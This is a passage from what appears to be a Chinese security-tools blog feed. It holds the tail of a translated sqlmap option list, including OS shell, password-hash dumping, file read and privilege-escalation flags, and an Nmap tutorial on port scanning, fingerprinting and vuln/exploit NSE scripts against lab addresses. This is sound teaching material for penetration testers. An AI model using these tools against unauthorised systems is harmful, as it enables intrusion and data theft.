对无效值使用随机字符串</span></span><br><span class="line">    <span class="comment">--no-cast           关闭 payload 构造机制</span></span><br><span class="line">    <span class="comment">--no-escape         关闭字符串转义机制</span></span><br><span class="line">    <span class="comment">--prefix=PREFIX     注入 payload 的前缀字符串</span></span><br><span class="line">    <span class="comment">--suffix=SUFFIX     注入 payload 的后缀字符串</span></span><br><span class="line">    <span class="comment">--tamper=TAMPER     用给定脚本修改注入数据</span></span><br><span class="line"></span><br><span class="line">  检测：</span><br><span class="line">    以下选项用于自定义检测方式</span><br><span class="line"></span><br><span class="line">    <span class="comment">--level=LEVEL       设置测试等级（1-5，默认为 1）</span></span><br><span class="line">    <span class="comment">--risk=RISK         设置测试风险等级（1-3，默认为 1）</span></span><br><span class="line">    <span class="comment">--string=STRING     用于确定查询结果为真时的字符串</span></span><br><span class="line">    <span class="comment">--not-string=NOT..  用于确定查询结果为假时的字符串</span></span><br><span class="line">    <span class="comment">--regexp=REGEXP     用于确定查询结果为真时的正则表达式</span></span><br><span class="line">    <span class="comment">--code=CODE         用于确定查询结果为真时的 HTTP 状态码</span></span><br><span class="line">    <span class="comment">--text-only         只根据页面文本内容对比页面</span></span><br><span class="line">    <span class="comment">--titles            只根据页面标题对比页面</span></span><br><span class="line"></span><br><span class="line">  技术：</span><br><span class="line">    以下选项用于调整特定 <span class="keyword">SQL</span> 注入技术的测试方法</span><br><span class="line"></span><br><span class="line">    <span class="comment">--technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span></span><br><span class="line">                        B: <span class="type">Boolean</span>-based blind <span class="keyword">SQL</span> injection（布尔型盲注）</span><br><span class="line">                        E: Error-based <span class="keyword">SQL</span> injection（报错型注入）</span><br><span class="line">                        U: <span class="keyword">UNION</span> query <span class="keyword">SQL</span> injection（联合查询注入）</span><br><span class="line">                        S: <span class="keyword">Stacked</span> queries <span class="keyword">SQL</span> injection（堆查询注入）</span><br><span class="line">                        T: <span class="type">Time</span>-based blind <span class="keyword">SQL</span> injection（时间型盲注）</span><br><span class="line">                        Q: <span class="keyword">inline</span> Query injection（内联查询注入）</span><br><span class="line">    <span class="comment">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span></span><br><span class="line">    <span class="comment">--union-cols=UCOLS  设置联合查询注入测试的列数目范围</span></span><br><span class="line">    <span class="comment">--union-char=UCHAR  用于暴力猜解列数的字符</span></span><br><span class="line">    <span class="comment">--union-from=UFROM  设置联合查询注入 FROM 处用到的表</span></span><br><span class="line">    <span class="comment">--dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span></span><br><span class="line">                        推荐阅读《在<span class="keyword">SQL</span>注入中使用DNS获取数据》</span><br><span class="line">                        http://cb.drops.wiki/drops/tips<span class="number">-5283.</span>html，</span><br><span class="line">                        在后面的“技术”小节中也有相应解释）</span><br><span class="line">    <span class="comment">--second-order=S..  设置二阶响应的结果显示页面的 URL（译者注：</span></span><br><span class="line">                        该选项用于二阶 <span class="keyword">SQL</span> 注入）</span><br><span class="line"></span><br><span class="line">  指纹识别：</span><br><span class="line">    -f, <span class="comment">--fingerprint   执行广泛的 DBMS 版本指纹识别</span></span><br><span class="line"></span><br><span class="line">  枚举：</span><br><span class="line">      以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。</span><br><span class="line">      此外，还可以运行你输入的 <span class="keyword">SQL</span> 语句</span><br><span class="line"></span><br><span class="line">    -a, <span class="comment">--all           获取所有信息、数据</span></span><br><span class="line">    -b, <span class="comment">--banner        获取 DBMS banner</span></span><br><span class="line">    <span class="comment">--current-user      获取 DBMS 当前用户</span></span><br><span class="line">    <span class="comment">--current-db        获取 DBMS 当前数据库</span></span><br><span class="line">    <span class="comment">--hostname          获取 DBMS 服务器的主机名</span></span><br><span class="line">    <span class="comment">--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span></span><br><span class="line">    <span class="comment">--users             枚举出 DBMS 所有用户</span></span><br><span class="line">    <span class="comment">--passwords         枚举出 DBMS 所有用户的密码哈希</span></span><br><span class="line">    <span class="comment">--privileges        枚举出 DBMS 所有用户特权级</span></span><br><span class="line">    <span class="comment">--roles             枚举出 DBMS 所有用户角色</span></span><br><span class="line">    <span class="comment">--dbs               枚举出 DBMS 所有数据库</span></span><br><span class="line">    <span class="comment">--tables            枚举出 DBMS 数据库中的所有表</span></span><br><span class="line">    <span class="comment">--columns           枚举出 DBMS 表中的所有列</span></span><br><span class="line">    <span class="comment">--schema            枚举出 DBMS 所有模式</span></span><br><span class="line">    <span class="comment">--count             获取数据表数目</span></span><br><span class="line">    <span class="comment">--dump              导出 DBMS 数据库表项</span></span><br><span class="line">    <span class="comment">--dump-all          导出所有 DBMS 数据库表项</span></span><br><span class="line">    <span class="comment">--search            搜索列，表和/或数据库名</span></span><br><span class="line">    <span class="comment">--comments          获取 DBMS 注释</span></span><br><span class="line">    -D DB               指定要枚举的 DBMS 数据库</span><br><span class="line">    -T TBL              指定要枚举的 DBMS 数据表</span><br><span class="line">    -C COL              指定要枚举的 DBMS 数据列</span><br><span class="line">    -X EXCLUDECOL       指定要排除的 DBMS 数据列</span><br><span class="line">    -U <span class="keyword">USER</span>             指定枚举的 DBMS 用户</span><br><span class="line">    <span class="comment">--exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span></span><br><span class="line">    <span class="comment">--pivot-column=P..  指定主列</span></span><br><span class="line">    <span class="comment">--where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span></span><br><span class="line">    <span class="comment">--start=LIMITSTART  指定要导出的数据表条目开始行数</span></span><br><span class="line">    <span class="comment">--stop=LIMITSTOP    指定要导出的数据表条目结束行数</span></span><br><span class="line">    <span class="comment">--first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span></span><br><span class="line">    <span class="comment">--last=LASTCHAR     指定获取返回查询结果的结束字符位</span></span><br><span class="line">    <span class="comment">--sql-query=QUERY   指定要执行的 SQL 语句</span></span><br><span class="line">    <span class="comment">--sql-shell         调出交互式 SQL shell</span></span><br><span class="line">    <span class="comment">--sql-file=SQLFILE  执行文件中的 SQL 语句</span></span><br><span class="line"></span><br><span class="line">  暴力破解：</span><br><span class="line">    以下选项用于暴力破解测试</span><br><span class="line"></span><br><span class="line">    <span class="comment">--common-tables     检测常见的表名是否存在</span></span><br><span class="line">    <span class="comment">--common-columns    检测常用的列名是否存在</span></span><br><span class="line"></span><br><span class="line">  用户自定义函数注入：</span><br><span class="line">    以下选项用于创建用户自定义函数</span><br><span class="line"></span><br><span class="line">    <span class="comment">--udf-inject        注入用户自定义函数</span></span><br><span class="line">    <span class="comment">--shared-lib=SHLIB  共享库的本地路径</span></span><br><span class="line"></span><br><span class="line">  访问文件系统：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的底层文件系统</span><br><span class="line"></span><br><span class="line">    <span class="comment">--file-read=RFILE   读取后端 DBMS 文件系统中的文件</span></span><br><span class="line">    <span class="comment">--file-write=WFILE  写入后端 DBMS 文件系统中的文件</span></span><br><span class="line">    <span class="comment">--file-dest=DFILE   使用文件绝对路径写入到后端 DBMS</span></span><br><span class="line"></span><br><span class="line">  访问操作系统：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的底层操作系统</span><br><span class="line"></span><br><span class="line">    <span class="comment">--os-cmd=OSCMD      执行操作系统命令</span></span><br><span class="line">    <span class="comment">--os-shell          调出交互式操作系统 shell</span></span><br><span class="line">    <span class="comment">--os-pwn            调出 OOB shell，Meterpreter 或 VNC</span></span><br><span class="line">    <span class="comment">--os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span></span><br><span class="line">    <span class="comment">--os-bof            利用存储过程的缓冲区溢出</span></span><br><span class="line">    <span class="comment">--priv-esc          数据库进程用户提权</span></span><br><span class="line">    <span class="comment">--msf-path=MSFPATH  Metasploit 框架的本地安装路径</span></span><br><span class="line">    <span class="comment">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span></span><br><span class="line"></span><br><span class="line">  访问 Windows 注册表：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的 Windows 注册表</span><br><span class="line"></span><br><span class="line">    <span class="comment">--reg-read          读取一个 Windows 注册表键值</span></span><br><span class="line">    <span class="comment">--reg-add           写入一个 Windows 注册表键值数据</span></span><br><span class="line">    <span class="comment">--reg-del           删除一个 Windows 注册表键值</span></span><br><span class="line">    <span class="comment">--reg-key=REGKEY    指定 Windows 注册表键</span></span><br><span class="line">    <span class="comment">--reg-value=REGVAL  指定 Windows 注册表键值</span></span><br><span class="line">    <span class="comment">--reg-data=REGDATA  指定 Windows 注册表键值数据</span></span><br><span class="line">    <span class="comment">--reg-type=REGTYPE  指定 Windows 注册表键值类型</span></span><br><span class="line"></span><br><span class="line">  通用选项：</span><br><span class="line">    以下选项用于设置通用的参数</span><br><span class="line"></span><br><span class="line">    -s SESSIONFILE      从文件（.sqlite）中读入会话信息</span><br><span class="line">    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件</span><br><span class="line">    <span class="comment">--batch             从不询问用户输入，使用默认配置</span></span><br><span class="line">    <span class="comment">--binary-fields=..  具有二进制值的结果字段（例如："digest"）</span></span><br><span class="line">    <span class="comment">--check-internet    在访问目标之前检查是否正常连接互联网</span></span><br><span class="line">    <span class="comment">--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span></span><br><span class="line">    <span class="comment">--crawl-exclude=..  用正则表达式筛选爬取的页面（例如："logout"）</span></span><br><span class="line">    <span class="comment">--csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span></span><br><span class="line">    <span class="comment">--charset=CHARSET   指定 SQL 盲注字符集（例如："0123456789abcdef"）</span></span><br><span class="line">    <span class="comment">--dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span></span><br><span class="line">    <span class="comment">--encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span></span><br><span class="line">    <span class="comment">--eta               显示每个结果输出的预计到达时间</span></span><br><span class="line">    <span class="comment">--flush-session     清空当前目标的会话文件</span></span><br><span class="line">    <span class="comment">--forms             解析并测试目标 URL 的表单</span></span><br><span class="line">    <span class="comment">--fresh-queries     忽略存储在会话文件中的查询结果</span></span><br><span class="line">    <span class="comment">--har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span></span><br><span class="line">    <span class="comment">--hex               获取数据时调用 DBMS 的 hex 函数</span></span><br><span class="line">    <span class="comment">--output-dir=OUT..  自定义输出目录路径</span></span><br><span class="line">    <span class="comment">--parse-errors      从响应中解析并显示 DBMS 错误信息</span></span><br><span class="line">    <span class="comment">--save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span></span><br><span class="line">    <span class="comment">--scope=SCOPE       用正则表达式从提供的代理日志中过滤目标</span></span><br><span class="line">    <span class="comment">--test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span></span><br><span class="line">    <span class="comment">--test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span></span><br><span class="line">    <span class="comment">--update            更新 sqlmap</span></span><br><span class="line"></span><br><span class="line">  其他选项：</span><br><span class="line">    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）</span><br><span class="line">    <span class="comment">--alert=ALERT       在找到 SQL 注入时运行 OS 命令</span></span><br><span class="line">    <span class="comment">--answers=ANSWERS   设置问题答案（例如：“quit=N,follow=N”）</span></span><br><span class="line">    <span class="comment">--beep              出现问题提醒或在发现 SQL 注入时发出提示音</span></span><br><span class="line">    <span class="comment">--cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表</span></span><br><span class="line">    <span class="comment">--dependencies      检查 sqlmap 缺少什么（非核心）依赖</span></span><br><span class="line">    <span class="comment">--disable-coloring  关闭彩色控制台输出</span></span><br><span class="line">    <span class="comment">--gpage=GOOGLEPAGE  指定页码使用 Google dork 结果</span></span><br><span class="line">    <span class="comment">--identify-waf      针对 WAF/IPS/IDS 保护进行彻底的测试</span></span><br><span class="line">    <span class="comment">--mobile            使用 HTTP User-Agent 模仿智能手机</span></span><br><span class="line">    <span class="comment">--offline           在离线模式下工作（仅使用会话数据）</span></span><br><span class="line">    <span class="comment">--purge-output      安全地删除输出目录的所有内容</span></span><br><span class="line">    <span class="comment">--skip-waf          跳过启发式检测 WAF/IPS/IDS 保护</span></span><br><span class="line">    <span class="comment">--smart             只有在使用启发式检测时才进行彻底的测试</span></span><br><span class="line">    <span class="comment">--sqlmap-shell      调出交互式 sqlmap shell</span></span><br><span class="line">    <span class="comment">--tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span></span><br><span class="line">    <span class="comment">--web-root=WEBROOT  指定 Web 服务器根目录（例如："/var/www"）</span></span><br><span class="line">    <span class="comment">--wizard            适合初级用户的向导界面</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap</title>
    <url>/posts/366383bb.html</url>
    <content><![CDATA[<h1 id="Nmap介绍与安装"><a href="#Nmap介绍与安装" class="headerlink" title="Nmap介绍与安装"></a>Nmap介绍与安装</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Nmap是一款开源、免费的网络探测、安全审计的工具。</p>
<a id="more"></a>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Nmap官网 ： <a href="https://nmap.org/" target="_blank" rel="noopener">https://nmap.org/</a></p>
<h3 id="windows下安装Nmap"><a href="#windows下安装Nmap" class="headerlink" title="windows下安装Nmap"></a>windows下安装Nmap</h3><p>进入Nmap官网点击exe文件下载<br>双击exe文件安装（无脑下一步，修改文件安装路径）</p>
<h3 id="linux下安装Nmap"><a href="#linux下安装Nmap" class="headerlink" title="linux下安装Nmap"></a>linux下安装Nmap</h3><p>进入Nmap官网复制以下命令进行安装<br>rpm -vhU <a href="https://nmap.org/dist/nmap-7.80-1.x86_64.rpm" target="_blank" rel="noopener">https://nmap.org/dist/nmap-7.80-1.x86_64.rpm</a></p>
<h2 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h2><h3 id="Nmap列举远程计算机开放的端口"><a href="#Nmap列举远程计算机开放的端口" class="headerlink" title="Nmap列举远程计算机开放的端口"></a>Nmap列举远程计算机开放的端口</h3><p>以下扫描全部使用kali命令行执行</p>
<h4 id="基础扫描端口"><a href="#基础扫描端口" class="headerlink" title="基础扫描端口"></a>基础扫描端口</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.1</span><span class="number">.104</span></span><br></pre></td></tr></table></figure>
<h4 id="Pn绕过防火墙"><a href="#Pn绕过防火墙" class="headerlink" title="-Pn绕过防火墙"></a>-Pn绕过防火墙</h4><p>对于已经知道主机存活或者防火墙开启的机器，可以使用-Pn参数来停止探测之前的ICMP请求。已达到不触发防火墙安全机制。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -Pn <span class="number">192.168</span><span class="number">.1</span><span class="number">.104</span></span><br></pre></td></tr></table></figure>
<h4 id="p扫描指定端口范围"><a href="#p扫描指定端口范围" class="headerlink" title="-p扫描指定端口范围"></a>-p扫描指定端口范围</h4><p>对于默认的端口范围，并不能满足日常工作需要。可以使用-p m-n来指定探测端口范围为m-n之间的所有端口。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p <span class="number">1</span><span class="number">-10000</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.104</span></span><br></pre></td></tr></table></figure>
<h4 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h4><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-Open 表示端口处于开放状态；</span></span><br><span class="line"><span class="deletion">-Closed 表示端口处于关闭状态；</span></span><br><span class="line"><span class="deletion">-Filterd 表示端口处于过滤无法收到返回的probe，但是无法确认；</span></span><br><span class="line"><span class="deletion">-Opend/UnFilterd 表示端口处于开放或者是未过滤状态；</span></span><br><span class="line"><span class="deletion">-Closed/UnFinished 表示端口处于关闭或者未过滤状态；</span></span><br></pre></td></tr></table></figure>
<h4 id="Nmap扫描技术查看"><a href="#Nmap扫描技术查看" class="headerlink" title="Nmap扫描技术查看"></a>Nmap扫描技术查看</h4><p>在命令行中，输入nmap -h 来查看nmap自带的帮助信息。</p>
<h3 id="Nmap识别目标机器上的服务指纹"><a href="#Nmap识别目标机器上的服务指纹" class="headerlink" title="Nmap识别目标机器上的服务指纹"></a>Nmap识别目标机器上的服务指纹</h3><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><p>为了确保有一个成功的渗透测试或网络设备监控，必须需要知道目标系统中服务的指纹信息。服务指纹信息包括服务端口、服务名和版本等。<br>通过分析目标往Nmap发送的数据包中某些协议标记、选项和数据，我们可以推断发送这些数据报的操作系统等。<br>Nmap通过向目标主机发送多个UDP与TCP数据包并分析其响应来进行操作系统指纹识别工作。</p>
<h4 id="Nmap识别服务指纹"><a href="#Nmap识别服务指纹" class="headerlink" title="Nmap识别服务指纹"></a>Nmap识别服务指纹</h4><p>使用命令 nmap -sV IP 地址 来识别目标机器的服务信息。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="Nmap侵略性的探测"><a href="#Nmap侵略性的探测" class="headerlink" title="Nmap侵略性的探测"></a>Nmap侵略性的探测</h4><p>使用命令 nmap -A -v -T4 ip地址 来探测目标机器的操作系统、服务等信息</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<p>使用nmap -sC -sV -O IP地址 来探测目标机器的操作系统、服务等信息。<br>其中sC参数表示使用Nmap脚本进行探测，sV表示探测目标机器上的服务信息，O表示探测目标机器的操作系统信息。-sC：equivalent to –script=default</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -O <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h3 id="Nmap发现局域网中存活主机"><a href="#Nmap发现局域网中存活主机" class="headerlink" title="Nmap发现局域网中存活主机"></a>Nmap发现局域网中存活主机</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>一个局域网中肯定是连接着多台设备，那么我们如何获取哪些设备正在开机状态呢？<br>使用ping ip 地址进行探测，但是如果一个网络很大的情况下，这样的手工探测显得很费劲。<br>可以使用不同的工具来进行批量探测，在探测之间需要明白CIDR的含义。<br>CIDR CIDR（无类别域间路由，Classless Inter-Domain Routing），可以快速表示一个网络。<br>比如：192.168.1.1/24 表示在192.168.1.1-192.168.1.255之间的所有主机IP地址。</p>
<h4 id="Nmap主机发现"><a href="#Nmap主机发现" class="headerlink" title="Nmap主机发现"></a>Nmap主机发现</h4><p>使用Nmap命令：nmap -sP CIDR 对该网络中所有主机进行ping扫描，以探测主机存活性。扫描过程中使用了TCP SYN扫描、ICMP echo Request来探测主机存活。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.248</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>使用Nmap命令：nmap -sn CIDR 对该网络中所有主机进行ping扫描，以探测主机存活性</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.248</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<h4 id="Nmap主机发现，结果输出"><a href="#Nmap主机发现，结果输出" class="headerlink" title="Nmap主机发现，结果输出"></a>Nmap主机发现，结果输出</h4><p>使用Nmap命令：nmap -sn CIDR -oX text.xml 对该网络中所有主机进行ping扫描，以探测主机存活性。<br>同时将结果输出到text.xml文件中，以便后续使用。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.248</span><span class="number">.1</span>/<span class="number">24</span> -oX text.xml</span><br></pre></td></tr></table></figure>

<h3 id="Nmap端口探测技巧"><a href="#Nmap端口探测技巧" class="headerlink" title="Nmap端口探测技巧"></a>Nmap端口探测技巧</h3><h4 id="对某个端口进行探测"><a href="#对某个端口进行探测" class="headerlink" title="对某个端口进行探测"></a>对某个端口进行探测</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p <span class="number">80</span> <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>

<h4 id="对某几个端口进行探测"><a href="#对某几个端口进行探测" class="headerlink" title="对某几个端口进行探测"></a>对某几个端口进行探测</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p <span class="number">80</span>,<span class="number">139</span> <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>

<h4 id="对某个范围端口进行探测"><a href="#对某个范围端口进行探测" class="headerlink" title="对某个范围端口进行探测"></a>对某个范围端口进行探测</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p <span class="number">1</span><span class="number">-100</span> <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>

<h4 id="对所有端口进行探测"><a href="#对所有端口进行探测" class="headerlink" title="对所有端口进行探测"></a>对所有端口进行探测</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p - <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="指定协议探测端口"><a href="#指定协议探测端口" class="headerlink" title="指定协议探测端口"></a>指定协议探测端口</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p T:<span class="number">25</span>,U:<span class="number">53</span> <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="通过协议名来扫描端口"><a href="#通过协议名来扫描端口" class="headerlink" title="通过协议名来扫描端口"></a>通过协议名来扫描端口</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p http <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="通过名称范围扫描"><a href="#通过名称范围扫描" class="headerlink" title="通过名称范围扫描"></a>通过名称范围扫描</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p h* <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="扫描注册在nmap中的端口"><a href="#扫描注册在nmap中的端口" class="headerlink" title="扫描注册在nmap中的端口"></a>扫描注册在nmap中的端口</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -p [<span class="number">1</span><span class="number">-65535</span>] <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h3 id="Nmap-NSE脚本使用"><a href="#Nmap-NSE脚本使用" class="headerlink" title="Nmap NSE脚本使用"></a>Nmap NSE脚本使用</h3><h4 id="NSE介绍"><a href="#NSE介绍" class="headerlink" title="NSE介绍"></a>NSE介绍</h4><p>NSE（Namp Script Engine）Nmap脚本引擎，内置很多可以用来扫描的、针对特定任务的脚本。通过NSE可以不断拓展Nmap的扫描策略，加强Nmap的功能。<br>Nmap中使用 –script 参数来指定调用的脚本，并且脚本存储在Nmap安装路径下的script文件夹下，对于kali Linux存储在/usr/share/nmap/script/下。</p>
<h4 id="NSE使用"><a href="#NSE使用" class="headerlink" title="NSE使用"></a>NSE使用</h4><p>使用Nmap探测 Web服务的title信息。 nmap –script 脚本名称 目标</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap --script http-title <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<p>以上通过Nmap使用http-title脚本进行探测，还可以使用其他脚本进行探测。目前为止可以用的有589个脚本，每个脚本都有其独特的作用。<br>使用Nmap探测http服务的http头 nmap –script http-headers 目标</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap --script http-headers <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="NSE分类使用"><a href="#NSE分类使用" class="headerlink" title="NSE分类使用"></a>NSE分类使用</h4><p>对于目标使用多个分类脚本进行探测，可以更快的找到目标的信息与弱点。<br>使用Nmap中漏洞分类脚本进行探测，使用命令如下：<br>nmap -sV –script vuln 目标</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sV --script vuln <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<p>使用Nmap中发现和版本信息分类进行探测，使用命令如下：<br>nmap -sV –script=”version,discovery” 目标</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">nmap -sV --script=<span class="string">"version,discovery"</span> <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<p>使用Nmap除了exploit分类之外的其他分类进行探测，使用命令如下：<br>nmap -sV –script=”not exploit” 目标<br>使用Nmap中http<em>的脚本，但是除了（http-brute和http-slowlors）,使用命令如下：<br>nmap -sV –script=”(http</em>) and not (http-slowlors and http-brute)” 目标</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">nmap -sV --script <span class="string">"(http*) and not (http-slowlors and http-brute)"</span> <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h3 id="NSE调试功能使用"><a href="#NSE调试功能使用" class="headerlink" title="NSE调试功能使用"></a>NSE调试功能使用</h3><p>使用Nmap中exploit，但是在使用的同时开启调试模式。使用命令如下：<br>nmap -sV –script exploit -d 3 –script-trace 目标<br>注意：-d（debug 范围0-9）</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sV --script exploit -d <span class="number">3</span> --script-trace <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="NSE参数的使用"><a href="#NSE参数的使用" class="headerlink" title="NSE参数的使用"></a>NSE参数的使用</h4><p>使用nmap的http-title脚本，并且指定使用对应的User-Agent。命令如下：<br>nmap -sV –script http-title –script-args http.useragent=”Mozilla 999″ 目标</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">nmap -sV --script http-title --script-args=<span class="string">"http.useragent="</span>Mozilla <span class="number">999</span><span class="string">""</span> <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="NSE更新"><a href="#NSE更新" class="headerlink" title="NSE更新"></a>NSE更新</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--script-updatedb</span></span><br></pre></td></tr></table></figure>
<h4 id="NSE脚本分类"><a href="#NSE脚本分类" class="headerlink" title="NSE脚本分类"></a>NSE脚本分类</h4><p>可以查看 <a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">https://nmap.org/nsedoc/</a></p>
<h3 id="Nmap使用特定网卡进行探测"><a href="#Nmap使用特定网卡进行探测" class="headerlink" title="Nmap使用特定网卡进行探测"></a>Nmap使用特定网卡进行探测</h3><h4 id="情景介绍"><a href="#情景介绍" class="headerlink" title="情景介绍"></a>情景介绍</h4><p>Nmap是一款可拓展性强的工具，并且有些NSE脚本支持嗅探。但是这种功能需要网卡支持混杂模式才可以。或者当计算机上有两张网卡，并且两张网卡对应的不同网络。<br>Nmap中提供了切换使用特定网卡进行探测的参数 -e</p>
<h4 id="指定网卡进行探测"><a href="#指定网卡进行探测" class="headerlink" title="指定网卡进行探测"></a>指定网卡进行探测</h4><p>使用Nmap命令行：nmap -e interface CIDR</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -e eth0 <span class="number">192.168</span><span class="number">.248</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<h3 id="Nmap对比扫描结果ndiff"><a href="#Nmap对比扫描结果ndiff" class="headerlink" title="Nmap对比扫描结果ndiff"></a>Nmap对比扫描结果ndiff</h3><h4 id="情景介绍-1"><a href="#情景介绍-1" class="headerlink" title="情景介绍"></a>情景介绍</h4><p>对某个网络进行探测的时候，有可能之前有探测过的结果，现在探测过后，需要对之前的结果与现在的结果对比，找到两次不同点。<br>监视网络变化，达到网络监控的目的。</p>
<h4 id="工具ndiff介绍"><a href="#工具ndiff介绍" class="headerlink" title="工具ndiff介绍"></a>工具ndiff介绍</h4><p>在Nmap整个过程中，除了主要的Nmap工具之外，还包括很多其他的工具。如接下来要使用到的ndiff工具。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span> -oX <span class="number">1.</span>xml</span><br></pre></td></tr></table></figure>
<p>制作两个不一样的xml文件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span> -oX <span class="number">2.</span>xml</span><br></pre></td></tr></table></figure>
<p>2.7.3 比较Nmap两次扫描结果<br>使用命令：</p>
